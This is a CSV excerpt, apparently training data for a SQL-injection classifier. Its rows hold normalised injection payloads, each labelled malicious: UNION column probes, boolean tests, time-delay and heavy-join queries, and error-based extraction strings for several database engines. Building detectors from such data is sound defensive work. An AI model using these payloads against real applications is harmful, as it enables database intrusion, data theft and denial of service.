row_index,payload_norm,label,sqli_type_hint
10290,1'|| ( select 'ldad' where 6146 = 6146 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) ) ||',1,
10291,1' ) ) ) and 2006 = 2006,1,
10292,-9100 ) or 8792 = 9550--,1,
10293,"1"" ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
10294,"1 and elt ( 3172 = 7243,7243 )",1,
10295,"-9613"" ) ) ) or elt ( 3125 = 7084,7084 ) and ( ( ( ""pupl"" = ""pupl",1,
10296,"1' ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
10297,"1'+ ( select sged where 1181 = 1181 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) +'",1,
10298,"1' ) ) ) union all select null,null,null,null,null--",1,
10299,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and 'mcrt' = 'mcrt,1,
10300,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) --",1,
10301,"1' in boolean mode ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
10302,"-4679 where 9634 = 9634 union all select 9634,9634,9634,9634,9634,9634,9634--",1,
10303,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( '%' = '",1,
10304,1' where 2967 = 2967,1,
10305,"1 ) where 5598 = 5598 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
10306,"1"" ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( ""zoag"" like ""zoag",1,
10307,select sleep ( 5 ) # yrpn,1,
10308,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm",1,
10309,"1%"" ) union all select null,null,null,null,null,null,null#",1,
10310,"-6548%"" ) union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--",1,
10311,-5352%' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( '%' = ',1,
10312,1 where 8135 = 8135,1,
10313,"1"" ) ) as turj where 1237 = 1237",1,
10314,1'|| ( select 'gdzt' where 4950 = 4950,1,
10315,"1"" ) ) as nncz where 2331 = 2331",1,
10316,"-5571' union all select 8846,8846,8846,8846,8846,8846,8846#",1,
10317,"1' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'eimq' = 'eimq",1,
10318,"1"" waitfor delay '0:0:5' and ""syhx"" = ""syhx",1,
10319,"-8667'+ ( select ymmg where 6132 = 6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132#",1,
